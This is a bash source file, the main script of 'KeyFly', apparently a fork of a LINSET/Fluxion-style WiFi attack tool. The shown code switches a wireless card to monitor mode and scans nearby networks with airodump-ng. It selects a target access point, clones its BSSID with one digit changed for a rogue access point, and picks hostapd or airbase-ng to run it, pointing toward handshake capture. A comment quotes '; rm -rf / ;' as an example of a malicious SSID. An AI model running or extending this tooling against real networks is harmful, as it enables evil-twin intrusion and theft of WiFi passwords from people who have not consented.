#!/bin/bash

################################ < KEYFLY Parameters > ################################
# NOTE: The KEYFLYPath constant will not be populated correctly if the script is called
# directly via a symlink. Symlinks in the path to the script should work completely fine.
declare -r KEYFLYPath="$( cd "$(dirname "$0")" ; pwd -P )"

declare -r KEYFLYWorkspacePath="/tmp/fluxspace"
declare -r KEYFLYHashPath="$KEYFLYPath/attacks/Handshake Snooper/handshakes"
declare -r KEYFLYScanDB="dump"

declare -r KEYFLYNoiseFloor=-90
declare -r KEYFLYNoiseCeiling=-60
version=2.1
declare -r KEYFLYVersion=2
declare -r KEYFLYRevision=1

declare -r KEYFLYDebug=${KEYFLYDebug:+1}
declare -r KEYFLYWIKillProcesses=${KEYFLYWIKillProcesses:+1}
declare -r KEYFLYWIReloadDriver=${KEYFLYWIReloadDriver:+1}
declare -r KEYFLYAuto=${KEYFLYAuto:+1}

# KEYFLYDebug [Normal Mode "" / Developer Mode 1]
declare -r KEYFLYOutputDevice=$([ $KEYFLYDebug ] && echo "/dev/stdout" || echo "/dev/null")

declare -r KEYFLYHoldXterm=$([ $KEYFLYDebug ] && echo "-hold" || echo "")

################################# < Library Includes > #################################
source lib/installer/InstallerUtils.sh
source lib/InterfaceUtils.sh
source lib/SandboxUtils.sh
source lib/FormatUtils.sh
source lib/ColorUtils.sh
source lib/IOUtils.sh
source lib/HashUtils.sh

################################ < KEYFLY Parameters > ################################
KEYFLYPrompt="$CRed[${CSBlu}keyfly$CSYel@$CSWht$HOSTNAME$CClr$CRed]-[$CSYel~$CClr$CRed]$CClr "
KEYFLYVLine="$CRed[$CSYel*$CClr$CRed]$CClr"

################################ < Library Parameters > ################################
InterfaceUtilsOutputDevice="$KEYFLYOutputDevice"

SandboxWorkspacePath="$KEYFLYWorkspacePath"
SandboxOutputDevice="$KEYFLYOutputDevice"

InstallerUtilsWorkspacePath="$KEYFLYWorkspacePath"
InstallerUtilsOutputDevice="$KEYFLYOutputDevice"
InstallerUtilsNoticeMark="$KEYFLYVLine"

PackageManagerLog="$InstallerUtilsWorkspacePath/package_manager.log"

IOUtilsHeader="keyfly_header"
IOUtilsQueryMark="$KEYFLYVLine"
IOUtilsPrompt="$KEYFLYPrompt"

HashOutputDevice="$KEYFLYOutputDevice"

################################# < Super User Check > #################################
if [ $EUID -ne 0 ]; then
	echo -e "${CRed}You don't have admin privilegies, execute the script as root.$CClr"
	exit 1
fi

################################### < XTerm Checks > ###################################
if [ ! "${DISPLAY:-}" ]; then
	echo -e "${CRed}The script should be exected inside a X (graphical) session.$CClr"
	exit 2
fi

if ! hash xdpyinfo 2>/dev/null; then
		echo -e "${CRed}xdpyinfo not installed, please install the relevant package for your distribution.$CClr"
		exit 3
fi

if ! xdpyinfo &> /dev/null; then
	echo -e "${CRed}The script failed to initialize an xterm test session.$CClr"
	exit 3
fi

################################# < Default Language > #################################
source language/es.sh

################################# < User Preferences > #################################
if [ -x "$KEYFLYPath/preferences.sh" ]; then source "$KEYFLYPath/preferences.sh"; fi

########################################################################################
function keyfly_exitmode() {
	if [ $KEYFLYDebug ]; then return 1; fi

	keyfly_header

	echo -e "$CWht[$CRed-$CWht]$CRed $KEYFLYCleanupAndClosingNotice$CClr"

    # List currently running processes which we might have to kill before exiting.
	local processes
	readarray processes < <(ps -A)

	# Currently, keyfly is only responsible for killing airodump-ng, because
	# keyfly explicitly it uses it to scan for candidate target access points.
	# NOTICE: Processes started by subscripts, such as an attack script,
	# MUST BE TERMINATED BY THAT SAME SCRIPT in the subscript's abort handler.
	local targets=("airodump-ng")

	local targetID # Program identifier/title
	for targetID in "${targets[@]}"; do
		# Get PIDs of all programs matching targetPID
		local targetPID=$(echo "${processes[@]}" | awk '$4~/'"$targetID"'/{print $1}')
		if [ ! "$targetPID" ]; then continue; fi
		echo -e "$CWht[$CRed-$CWht] `io_dynamic_output $KEYFLYKillingProcessNotice`"
		killall $targetPID &> $KEYFLYOutputDevice
	done


	# If the installer activated the package manager, make sure to undo any changes.
    if [ "$PackageManagerCLT" ]; then
        echo -e "$CWht[$CRed-$CWht] "$(io_dynamic_output "$KEYFLYRestoringPackageManagerNotice")"$CClr"
        unprep_package_manager
    fi


	if [ "$WIMonitor" ]; then
		echo -e "$CWht[$CRed-$CWht] $KEYFLYDisablingMonitorNotice$CGrn $WIMonitor$CClr"
		if [ "$KEYFLYAirmonNG" ]
			then airmon-ng stop "$WIMonitor" &> $KEYFLYOutputDevice
			else interface_set_mode "$WIMonitor" "managed"
		fi
	fi

	echo -e "$CWht[$CRed-$CWht] $KEYFLYRestoringTputNotice$CClr"
	tput cnorm

	if [ ! $KEYFLYDebug ]; then
		echo -e "$CWht[$CRed-$CWht] $KEYFLYDeletingFilesNotice$CClr"
		sandbox_remove_workfile "$KEYFLYWorkspacePath/*"
	fi

	if [ $KEYFLYWIKillProcesses ]; then
		echo -e "$CWht[$CRed-$CWht] $KEYFLYRestartingNetworkManagerNotice$CClr"

		# systemctl check
		systemd=$(whereis systemctl)
		if [ "$systemd" = "" ];then
			service network-manager restart &> $KEYFLYOutputDevice &
			service networkmanager restart &> $KEYFLYOutputDevice &
			service networking restart &> $KEYFLYOutputDevice &
		else
			systemctl restart NetworkManager &> $KEYFLYOutputDevice &
		fi
	fi

	echo -e "$CWht[$CGrn+$CWht] $CGrn$KEYFLYCleanupSuccessNotice$CClr"
	echo -e "$CWht[$CGrn+$CWht] $CGry$KEYFLYThanksSupportersNotice$CClr"

	sleep 3

	clear

	exit 0
}

# Delete log only in Normal Mode !
function keyfly_conditional_clear() {
	# Clear iff we're not in debug mode
	if [ ! $KEYFLYDebug ]; then clear; fi
}

function keyfly_conditional_bail() {
	echo ${1:-"Something went wrong, whoops! (report this)"}; sleep 5
	if [ ! $KEYFLYDebug ]
		then keyfly_handle_exit; return 1
	fi
	echo "Press any key to continue execution..."
	read bullshit
}

# ERROR Report only in Developer Mode
function keyfly_error_report() {
	echo "Error on line $1"
}

if [ "$KEYFLYDebug" ]; then
	trap 'keyfly_error_report $LINENUM' ERR
fi

function keyfly_handle_abort_attack() {
	if [ $(type -t stop_attack) ]; then
		stop_attack &> $KEYFLYOutputDevice
		unprep_attack &> $KEYFLYOutputDevice
	else
		echo "Attack undefined, can't stop anything..." > $KEYFLYOutputDevice
	fi
}

# In case an abort signal is received,
# abort any attacks currently running.
trap keyfly_handle_abort_attack SIGABRT

function keyfly_handle_exit() {
	keyfly_handle_abort_attack
	keyfly_exitmode
	exit 1
}

# In case of unexpected termination, run keyfly_exitmode
# to execute cleanup and reset commands.
trap keyfly_handle_exit SIGINT SIGHUP

function keyfly_header() {
clear
echo
echo -e "${CGrn}	  ##########################################################"
echo -e "${CGrn}	  #                                                        #"
echo -e "${CGrn}	  #$CYel 	       KeyFly $version"" $CSBlu$by $CWht Kevin Petrikov""${CGrn}                 #"
echo -e "${CGrn}	  #$CYel 	              WIFISLAX" "$CBlu 1.1-A""${CRed} Atlas	  ""         ${CGrn}#"
echo -e "${CGrn}	  #                                                        #"
echo -e "${CGrn}	  #  Basado en LINSET de vk496 para el grupo WIFISLAX 4.12 #"
echo -e "${CGrn}	  #                                                        #"
echo -e "${CGrn}	  #      $CYel .:VIDE:.    $CBlu .:AUDI:.      $CRed .:TACE:.             ${CGrn}#"
echo -e "${CGrn}	  ##########################################################""$color"
echo
echo
}


# Create working directory
if [ ! -d "$KEYFLYWorkspacePath" ]; then
	mkdir -p "$KEYFLYWorkspacePath" &> $KEYFLYOutputDevice
fi

####################################### < Start > ######################################
if [ ! $KEYFLYDebug ]; then
	KEYFLYBanner=()

	
clear && echo
sleep 0.1 && echo -e $CYel" _   __           _        ______    _        _ _             "
sleep 0.1 && echo -e $CYel"| | / /          (_)       | ___ \  | |      (_) |             "
sleep 0.1 && echo -e $CYel"| |/ /  _____   ___ _ __   | |_/ /__| |_ _ __ _| | _______   __"
sleep 0.1 && echo -e $CBlu"|    \ / _ \ \ / / | '_ \  |  __/ _ \ __| '__| | |/ / _ \ \ / /"
sleep 0.1 && echo -e $CBlu"| |\  \  __/\ V /| | | | | | | |  __/ |_| |  | |   < (_) \ V /"
sleep 0.1 && echo -e $CRed"\_| \_/\___| \_/ |_|_| |_| \_|  \___|\__|_|  |_|_|\_\___/ \_/  "
sleep 0.1 && echo -e $CRed"                                                         $CWht $version"
sleep 2


	if [ "$KEYFLYAuto" ]
		then echo -e "$CBlu"
		else echo -e "$CRed"
	fi

	for line in "${KEYFLYBanner[@]}"
		do echo "$line"; sleep 0.05
	done
function top {
	
clear && echo -en "\e[3J"
echo
echo -e "${CGrn}	  ##########################################################"
echo -e "${CGrn}	  #                                                        #"
echo -e "${CGrn}	  #$CYel 	       KeyFly $version"" $CSBlu$by $CWht Kevin Petrikov""${CBlu}               #"
echo -e "${CGrn}	  #$CYel 	              WIFISLAX" "$CRed 1.1-A""${CGrn} Atlas	  ""           #"
echo -e "${CGrn}	  #                                                        #"
echo -e "${CGrn}	  #  Basado en LINSET de vk496 para el grupo WIFISLAX 4.12 #"
echo -e "${CGrn}	  #                                                        #"
echo -e "${CGrn}	  #      .:VIDE:.     .:AUDI:.       .:TACE:.              #"
echo -e "${CGrn}	  ##########################################################""$color"
echo
echo
}

	echo

	
	sleep 0.1
	format_center_literals "${CGrn}Site: ${CRed}https://github.com/KeyflyNetwork/keyfly$CClr"; echo -e "$FormatCenterLiterals"

	sleep 0.1
	format_center_literals "${CSRed}KEYFLY $KEYFLYVersion$CClr (rev. $CSBlu$KEYFLYRevision$CClr)$CYel by$CWht Kevin Petrikov"; echo -e "$FormatCenterLiterals"


	echo

	KEYFLYCLIToolsRequired=("aircrack-ng" "python2:python2.7|python2" "bc" "awk:awk|gawk|mawk" "curl" "dhcpd:isc-dhcp-server|dhcp" "7zr:p7zip" "hostapd" "lighttpd" "iwconfig:wireless-tools" "macchanger" "mdk3" "nmap" "openssl" "php-cgi" "pyrit" "xterm" "rfkill" "unzip" "route:net-tools" "fuser:psmisc" "killall:psmisc")
	KEYFLYCLIToolsMissing=()

	while ! installer_utils_check_dependencies KEYFLYCLIToolsRequired[@]
		do installer_utils_run_dependencies InstallerUtilsCheckDependencies[@]
	done
fi

#################################### < Resolution > ####################################
function keyfly_set_resolution() { # Windows + Resolution
    # Calc options
    RATIO=4

    # Get demensions
    SCREEN_SIZE=$(xdpyinfo | grep dimension | awk '{print $4}' | tr -d "(")
    SCREEN_SIZE_X=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $1}'))
    SCREEN_SIZE_Y=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $2}'))

    PROPOTION=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/$SCREEN_SIZE_Y}")/1 | bc)
    NEW_SCREEN_SIZE_X=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/$RATIO}")/1 | bc)
    NEW_SCREEN_SIZE_Y=$(echo $(awk "BEGIN {print $SCREEN_SIZE_Y/$RATIO}")/1 | bc)

    NEW_SCREEN_SIZE_BIG_X=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_X/$RATIO}")/1 | bc)
    NEW_SCREEN_SIZE_BIG_Y=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_Y/$RATIO}")/1 | bc)

    SCREEN_SIZE_MID_X=$(echo $(($SCREEN_SIZE_X+($SCREEN_SIZE_X-2*$NEW_SCREEN_SIZE_X)/2)))
    SCREEN_SIZE_MID_Y=$(echo $(($SCREEN_SIZE_Y+($SCREEN_SIZE_Y-2*$NEW_SCREEN_SIZE_Y)/2)))

    # Upper
    TOPLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0+0"
    TOPRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+0"
    TOP="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X+0"

    # Lower
    BOTTOMLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-0"
    BOTTOMRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0-0"
    BOTTOM="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X-0"

    # Y mid
    LEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-$SCREEN_SIZE_MID_Y"
    RIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+$SCREEN_SIZE_MID_Y"

    # Big
    TOPLEFTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y+0+0"
    TOPRIGHTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y-0+0"
}

##################################### < Language > #####################################
function keyfly_set_language() {
	if [ "$KEYFLYAuto" ]; then
		KEYFLYLanguage="en"
	else
		# Get all languages available.
		local languageCodes
		readarray -t languageCodes < <(ls -1 language | sed -E 's/\.sh//')

		local languages
		readarray -t languages < <(head -n 3 language/*.sh | grep -E "^# native: " | sed -E 's/# \w+: //')

		io_query_format_fields "$KEYFLYVLine Escoge tu idioma" "\t$CRed[$CSYel%d$CClr$CRed]$CClr %s / %s\n" languageCodes[@] languages[@]

		KEYFLYLanguage=${IOQueryFormatFields[0]}

		echo # Leave this spacer.

		# Check if all language files are present for the selected language.
		find -type d -name language | while read language_dir; do
			if [ ! -e "$language_dir/${KEYFLYLanguage}.sh" ]; then
				echo -e "$KEYFLYVLine ${CYel}Warning${CClr}, missing language file:"
				echo -e "\t$language_dir/${KEYFLYLanguage}.sh"
				return 1
			fi
		done

		# If a file is missing, fall back to english.
		if [ $? -eq 1 ]; then
			echo -e "\n\n$KEYFLYVLine Falling back to English..."; sleep 5
			KEYFLYLanguage="en"
			return 1
		fi

		source "$KEYFLYPath/language/$KEYFLYLanguage.sh"
	fi
}


#################################### < Interfaces > ####################################
function keyfly_unset_interface() {
	# Unblock interfaces to make them available.
	echo -e "$KEYFLYVLine $KEYFLYUnblockingWINotice"
	rfkill unblock all

	# Find all monitor-mode interfaces & all AP interfaces.
	echo -e "$KEYFLYVLine $KEYFLYFindingExtraWINotice"
	local wiMonitors=($(iwconfig 2>&1 | grep "Mode:Monitor" | awk '{print $1}'))

	# Remove all monitor-mode & all AP interfaces.
	echo -e "$KEYFLYVLine $KEYFLYRemovingExtraWINotice"
	if [ ${#wiMonitors[@]} -gt 0 ]; then
		local monitor
		for monitor in ${wiMonitors[@]}; do
			# Remove any previously created keyfly AP interfaces.
			#iw dev "FX${monitor:2}AP" del &> $KEYFLYOutputDevice

			# Remove monitoring interface after AP interface.
			if [[ "$monitor" = *"mon" ]]
			then airmon-ng stop "$monitor" > $KEYFLYOutputDevice
			else interface_set_mode "$monitor" "managed"
			fi

			if [ $KEYFLYDebug ]; then
				echo -e "Stopped $monitor."
			fi
		done
	fi

	WIMonitor=""
}

# Choose Interface
function keyfly_set_interface() {
	if [ "$WIMonitor" ]; then return 0; fi

	keyfly_unset_interface

	# Gather candidate interfaces.
	echo -e "$KEYFLYVLine $KEYFLYFindingWINotice"

	# List of all available wireless network interfaces.
	# These will be stored in our array right below.
	interface_list_wireless

	local wiAlternate=("$KEYFLYGeneralRepeatOption")
	local wiAlternateInfo=("")
	local wiAlternateState=("")
	local wiAlternateColor=("$CClr")

	interface_prompt "$KEYFLYVLine $KEYFLYInterfaceQuery" InterfaceListWireless[@] \
	wiAlternate[@] wiAlternateInfo[@] wiAlternateState[@] wiAlternateColor[@]

	local wiSelected=$InterfacePromptIfSelected

	if [ "$wiSelected" = "$KEYFLYGeneralRepeatOption" ]
		then keyfly_unset_interface; return 1
	fi

	if [ ! "$KEYFLYWIKillProcesses" -a "$InterfacePromptIfSelectedState" = "[-]" ]; then
		echo -e "$KEYFLYVLine $KEYFLYSelectedBusyWIError"
		echo -e "$KEYFLYVLine $KEYFLYSelectedBusyWITip"
		sleep 7; keyfly_unset_interface; return 1;
	fi

	if ! keyfly_run_interface "$wiSelected"
		then return 1
	fi

	WIMonitor="$KeyflyRunInterface"
}

function keyfly_run_interface() {
	if [ ! "$1" ]; then return 1; fi

	local ifSelected="$1"

	if [ "$KEYFLYWIReloadDriver" ]; then
		# Get selected interface's driver details/info-descriptor.
		echo -e "$KEYFLYVLine $KEYFLYGatheringWIInfoNotice"

		if ! interface_driver "$ifSelected"
			then echo -e "$KEYFLYVLine$CRed $KEYFLYUnknownWIDriverError"; sleep 3; return 1
		fi

		local ifDriver="$InterfaceDriver"

		# I'm not really sure about this conditional here.
		# KEYFLY 2 had the conditional so I kept it there.
		if [ ! "$(echo $ifDriver | egrep 'rt2800|rt73')" ]
			then rmmod -f $ifDriver &> $KEYFLYOutputDevice 2>&1

			# Wait while interface becomes unavailable.
			echo -e "$KEYFLYVLine `io_dynamic_output $KEYFLYUnloadingWIDriverNotice`"
			while interface_physical "$ifSelected"
				do sleep 1
			done
		fi
	fi

	if [ "$KEYFLYWIKillProcesses" ]; then
		# Get list of potentially troublesome programs.
		echo -e "$KEYFLYVLine $KEYFLYFindingConflictingProcessesNotice"
		# This shit has to go reeeeeal soon (airmon-ng)...
		local conflictPrograms=($(airmon-ng check | awk 'NR>6{print $2}'))

		# Kill potentially troublesome programs.
		echo -e "$KEYFLYVLine $KEYFLYKillingConflictingProcessesNotice"
		for program in "${conflictPrograms[@]}"
			do killall "$program" &> $KEYFLYOutputDevice
		done
	fi

	if [ "$KEYFLYWIReloadDriver" ]; then
		# I'm not really sure about this conditional here.
		# KEYFLY 2 had the conditional so I kept it there.
		if [ ! "$(echo $ifDriver | egrep 'rt2800|rt73')" ]
			then modprobe "$ifDriver" &> $KEYFLYOutputDevice 2>&1
		fi

		# Wait while interface becomes available.
		echo -e "$KEYFLYVLine `io_dynamic_output $KEYFLYLoadingWIDriverNotice`"
		while ! interface_physical "$ifSelected"
			do sleep 1
		done
	fi

	# Activate wireless interface monitor mode and save identifier.
	echo -e "$KEYFLYVLine $KEYFLYStartingWIMonitorNotice"
	if [ "$KEYFLYAirmonNG" ]; then
		# TODO: Need to check weather switching to monitor mode below failed.
		# Notice: Line below could cause issues with different airmon versions.
		KeyflyRunInterface=$(airmon-ng start $ifSelected | awk -F'\[phy[0-9]+\]|\)' '$0~/monitor .* enabled/{print $3}' 2> /dev/null)
	else
		if interface_set_mode "$ifSelected" "monitor"
			then KeyflyRunInterface=$ifSelected
			else KeyflyRunInterface=""
		fi
	fi

	if [ "$KeyflyRunInterface" ]
		then echo -e "$KEYFLYVLine $KEYFLYMonitorModeWIEnabledNotice"; sleep 3
		else echo -e "$KEYFLYVLine $KEYFLYMonitorModeWIFailedError"; sleep 3; return 2
	fi
}

###################################### < Scanner > #####################################
function keyfly_set_scanner() {
	# If scanner's already been set and globals are ready, we'll skip setup.
	if [ "$APTargetSSID" -a "$APTargetChannel" -a "$APTargetEncryption" -a \
		 "$APTargetMAC" -a "$APTargetMakerID" -a "$APRogueMAC" ]; then
		return 0
	fi

	if [ "$KEYFLYAuto" ];then
		keyfly_run_scanner $WIMonitor
	else
		local choices=("$KEYFLYScannerChannelOptionAll (2.4GHz)" "$KEYFLYScannerChannelOptionAll (5GHz)" "$KEYFLYScannerChannelOptionAll (2.4GHz & 5Ghz)" "$KEYFLYScannerChannelOptionSpecific" "$KEYFLYGeneralBackOption")
		io_query_choice "$KEYFLYScannerChannelQuery" choices[@]

		echo

		case "$IOQueryChoice" in
			"$KEYFLYScannerChannelOptionAll (2.4GHz)") keyfly_run_scanner $WIMonitor "" "bg";;
			"$KEYFLYScannerChannelOptionAll (5GHz)") keyfly_run_scanner $WIMonitor "" "a";;
			"$KEYFLYScannerChannelOptionAll (2.4GHz & 5Ghz)") keyfly_run_scanner $WIMonitor "" "abg";;
			"$KEYFLYScannerChannelOptionSpecific") keyfly_set_scanner_channel;;
			"$KEYFLYGeneralBackOption") keyfly_unset_interface; return 1;;
		esac
	fi

	if [ $? -ne 0 ]; then return 1; fi
}

function keyfly_set_scanner_channel() {
	keyfly_header

	echo -e  "$KEYFLYVLine $KEYFLYScannerChannelQuery"
	echo
	echo -e  "     $KEYFLYScannerChannelSingleTip ${CBlu}6$CClr               "
	echo -e  "     $KEYFLYScannerChannelMiltipleTip ${CBlu}1-5$CClr             "
	echo -e  "     $KEYFLYScannerChannelMiltipleTip ${CBlu}1,2,5-7,11$CClr      "
	echo
	echo -ne "$KEYFLYPrompt"

	local channels; read channels

	echo

	keyfly_run_scanner $WIMonitor $channels
	if [ $? -ne 0 ]; then return 1; fi
}

# Parameters: monitor [ channel(s) [ band(s) ] ]
function keyfly_run_scanner() {
	if [ ${#@} -lt 1 ]; then return 1; fi;

	echo -e "$KEYFLYVLine $KEYFLYStartingScannerNotice"
	echo -e "$KEYFLYVLine $KEYFLYStartingScannerTip"

	# Remove any pre-existing scanner results.
	sandbox_remove_workfile "$KEYFLYWorkspacePath/dump*"

	if [ "$KEYFLYAuto" ]; then
		sleep 30 && killall xterm &
	fi

	# Begin scanner and output all results to "dump-01.csv."
	if ! xterm -title "$KEYFLYScannerHeader" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e "airodump-ng -Mat WPA "${2:+"--channel $2"}" "${3:+"--band $3"}" -w \"$KEYFLYWorkspacePath/dump\" $1" 2> /dev/null; then
		echo -e "$KEYFLYVLine$CRed $KEYFLYGeneralXTermFailureError"; sleep 5; return 1
	fi

	# Fix this below, creating subshells for something like this is somewhat ridiculous.
	local scannerResultsExist=$([ -f "$KEYFLYWorkspacePath/dump-01.csv" ] && echo true)
	local scannerResultsReadable=$([ -s "$KEYFLYWorkspacePath/dump-01.csv" ] && echo true)

	if [ ! "$scannerResultsReadable" ]; then
		if [ "$scannerResultsExist" ]; then
			sandbox_remove_workfile "$KEYFLYWorkspacePath/dump*"
		fi

		local choices=("$KEYFLYGeneralBackOption" "$KEYFLYGeneralExitOption")
		io_query_choice "$KEYFLYScannerFailedNotice" choices[@]

		echo

		case "$IOQueryChoice" in
			"$KEYFLYGeneralBackOption") return 1;;
			"$KEYFLYGeneralExitOption") keyfly_exitmode; return 2;;
		esac
	fi

	# Syntheize scan operation results from output file "dump-01.csv."
	echo -e "$KEYFLYVLine $KEYFLYPreparingScannerResultsNotice"
	# Unfortunately, mawk (alias awk) does not support the {n} times matching operator.
	# readarray TargetAPCandidates < <(gawk -F, 'NF==15 && $1~/([A-F0-9]{2}:){5}[A-F0-9]{2}/ {print $0}' $KEYFLYWorkspacePath/dump-01.csv)
	readarray TargetAPCandidates < <(awk -F, 'NF==15 && length($1)==17 && $1~/([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]/ {print $0}' "$KEYFLYWorkspacePath/dump-01.csv")
	# readarray TargetAPCandidatesClients < <(gawk -F, 'NF==7 && $1~/([A-F0-9]{2}:){5}[A-F0-9]{2}/ {print $0}' $KEYFLYWorkspacePath/dump-01.csv)
	readarray TargetAPCandidatesClients < <(awk -F, 'NF==7 && length($1)==17 && $1~/([A-F0-9][A-F0-9]:)+[A-F0-9][A-F0-9]/ {print $0}' "$KEYFLYWorkspacePath/dump-01.csv")

	# Cleanup the workspace to prevent potential bugs/conflicts.
	sandbox_remove_workfile "$KEYFLYWorkspacePath/dump*"

	if [ ${#TargetAPCandidates[@]} -eq 0 ]; then
		sandbox_remove_workfile "$KEYFLYWorkspacePath/dump*"

		echo -e "$KEYFLYVLine $KEYFLYScannerDetectedNothingNotice"
		sleep 3; return 1
	fi
}


###################################### < Target > ######################################
function keyfly_unset_target_ap() {
	APTargetSSID=""
	APTargetChannel=""
	APTargetEncryption=""
	APTargetMAC=""
	APTargetMakerID=""
	APTargetMaker=""
	APRogueMAC=""
}

function keyfly_set_target_ap() {
	if [ "$APTargetSSID" -a "$APTargetChannel" -a "$APTargetEncryption" -a \
		 "$APTargetMAC" -a "$APTargetMakerID" -a "$APRogueMAC" ]; then
		return 0
	fi

	keyfly_unset_target_ap

	local TargetAPCandidatesMAC=()
	local TargetAPCandidatesClientsCount=()
	local TargetAPCandidatesChannel=()
	local TargetAPCandidatesSecurity=()
	local TargetAPCandidatesSignal=()
	local TargetAPCandidatesPower=()
	local TargetAPCandidatesESSID=()
	local TargetAPCandidatesColor=()

	for candidateAPInfo in "${TargetAPCandidates[@]}"; do
		candidateAPInfo=$(echo "$candidateAPInfo" | sed -r "s/,\s*/,/g")

		local i=${#TargetAPCandidatesMAC[@]}

		TargetAPCandidatesMAC[i]=$(echo "$candidateAPInfo" | cut -d , -f 1)
		TargetAPCandidatesClientsCount[i]=$(echo "${TargetAPCandidatesClients[@]}" | grep -c "${TargetAPCandidatesMAC[i]}")
		TargetAPCandidatesChannel[i]=$(echo "$candidateAPInfo" | cut -d , -f 4)
		TargetAPCandidatesSecurity[i]=$(echo "$candidateAPInfo" | cut -d , -f 6)
		TargetAPCandidatesPower[i]=$(echo "$candidateAPInfo" | cut -d , -f 9)
		TargetAPCandidatesColor[i]=$([ ${TargetAPCandidatesClientsCount[i]} -gt 0 ] && echo $CGrn || echo $CClr)

        # Parse any non-ascii characters by letting bash handle them.
        # Just escape all single quotes in ESSID and let bash's $'...' handle it.
        local sanitizedESSID=$(echo "${candidateAPInfo//\'/\\\'}" | cut -d , -f 14)
		TargetAPCandidatesESSID[i]=$(eval "echo \$'$sanitizedESSID'")

		local power=${TargetAPCandidatesPower[i]}
		if [ $power -eq -1 ]; then
			# airodump-ng's man page says -1 means unsupported value.
			TargetAPCandidatesQuality[i]="??";
		elif [ $power -le $KEYFLYNoiseFloor ]; then
			TargetAPCandidatesQuality[i]=0;
		elif [ $power -gt $KEYFLYNoiseCeiling ]; then
			TargetAPCandidatesQuality[i]=100;
		else
			# Bash doesn't support floating point division, so I gotta work around it...
			# The function is Q = ((P - F) / (C - F)); Q - quality, P - power, F - floor, C - Ceiling.
			TargetAPCandidatesQuality[i]=$((( ${TargetAPCandidatesPower[i]} * 10 - $KEYFLYNoiseFloor * 10 ) / ( ( $KEYFLYNoiseCeiling - $KEYFLYNoiseFloor ) / 10 ) ))
		fi
	done

	local headerTitle=$(format_center_literals "WIFI LIST"; echo -n "$FormatCenterLiterals\n\n")

	format_apply_autosize "$CRed[$CSYel ** $CClr$CRed]$CClr %-*.*s %4s %3s %3s %2s %-8.8s %18s\n"
	local headerFields=$(printf "$FormatApplyAutosize" "ESSID" "QLTY" "PWR" "STA" "CH" "SECURITY" "BSSID")


	format_apply_autosize "$CRed[$CSYel%03d$CClr$CRed]%b %-*.*s %3s%% %3s %3d %2s %-8.8s %18s\n"
	io_query_format_fields "$headerTitle$headerFields" "$FormatApplyAutosize" \
						TargetAPCandidatesColor[@] \
						TargetAPCandidatesESSID[@] \
						TargetAPCandidatesQuality[@] \
						TargetAPCandidatesPower[@] \
						TargetAPCandidatesClientsCount[@] \
						TargetAPCandidatesChannel[@] \
						TargetAPCandidatesSecurity[@] \
						TargetAPCandidatesMAC[@]

	echo

	APTargetSSID=${IOQueryFormatFields[1]}
	APTargetChannel=${IOQueryFormatFields[5]}
	APTargetEncryption=${IOQueryFormatFields[6]}
	APTargetMAC=${IOQueryFormatFields[7]}
	APTargetMakerID=${APTargetMAC:0:8}
	APTargetMaker=$(macchanger -l | grep ${APTargetMakerID,,} | cut -d ' ' -f 5-)

	# Sanitize network ESSID to normalize it and make it safe for manipulation.
	# Notice: Why remove these? Because some smartass might decide to name their
	# network something like "; rm -rf / ;". If the string isn't sanitized accidentally
	# shit'll hit the fan and we'll have an extremely distressed person subit an issue.
	# Removing: ' ', '/', '.', '~', '\'
	APTargetSSIDClean=$(echo "$APTargetSSID" | sed -r 's/( |\/|\.|\~|\\)+/_/g')

	# We'll change a single hex digit from the target AP's MAC address.
	# This new MAC address will be used as the rogue AP's MAC address.
	local APRogueMACChange=$(printf %02X $((0x${APTargetMAC:13:1} + 1)))
	APRogueMAC="${APTargetMAC::13}${APRogueMACChange:1:1}${APTargetMAC:14:4}"
}

function keyfly_show_ap_info() {
	format_apply_autosize "%*s$CBlu%7s$CClr: %-32s%*s\n"

	local colorlessFormat="$FormatApplyAutosize"
	local colorfullFormat=$(echo "$colorlessFormat" | sed -r 's/%-32s/-%32b/g')

	printf "$colorlessFormat" "" "ESSID" "\"$APTargetSSID\" / $APTargetEncryption" ""
	printf "$colorlessFormat" "" "Channel" "$APTargetChannel" ""
	printf "$colorfullFormat" "" "BSSID" "$APTargetMAC ($CYel${APTargetMaker:-UNKNOWN}$CClr)" ""

	echo
}


#################################### < AP Service > ####################################
function keyfly_unset_ap_service() {
	APRogueService="";
}

function keyfly_set_ap_service() {
	if [ "$APRogueService" ]; then return 0; fi

	keyfly_unset_ap_service

	if [ "$KEYFLYAuto" ]; then
		APRogueService="hostapd";
	else
		keyfly_header

		echo -e "$KEYFLYVLine $KEYFLYAPServiceQuery"
		echo

		keyfly_show_ap_info "$APTargetSSID" "$APTargetEncryption" "$APTargetChannel" "$APTargetMAC" "$APTargetMaker"

		local choices=("$KEYFLYAPServiceHostapdOption" "$KEYFLYAPServiceAirbaseOption" "$KEYFLYGeneralBackOption")
		io_query_choice "" choices[@]

		echo

		case "$IOQueryChoice" in
			"$KEYFLYAPServiceHostapdOption" ) APRogueService="hostapd";;
			"$KEYFLYAPServiceAirbaseOption" ) APRogueService="airbase-ng";;
			"$KEYFLYGeneralBackOption" ) keyfly_unset_ap_service; return 1;;
			* ) keyfly_conditional_bail; return 1;;
		esac
	fi

	# AP Service: Load the service's helper routines.
	source "lib/ap/$APRogueService.sh"
}

###################################### < Hashes > ######################################
